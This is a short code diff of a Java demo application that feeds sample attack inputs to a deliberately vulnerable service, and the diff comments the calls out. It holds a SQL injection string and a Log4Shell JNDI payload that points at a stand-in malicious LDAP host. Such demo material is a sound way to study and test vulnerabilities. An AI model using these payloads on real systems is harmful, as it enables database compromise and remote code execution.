@@ -4,6 +4,7 @@ public class DemoApplication {
     public static void main(String[] args) {
         VulnerableService service = new VulnerableService();
 
+        /*
         // SQL Injection
         service.vulnerableSqlQuery("admin' OR '1'='1");
 
@@ -17,6 +18,6 @@ public class DemoApplication {
 
         // Log4j JNDI injection (Log4Shell) example input
         String maliciousLogInput = "${jndi:ldap://malicious-server.com/a}";
-        service.log4jJndiInjection(maliciousLogInput);
+        service.log4jJndiInjection(maliciousLogInput);*/
     }
 }
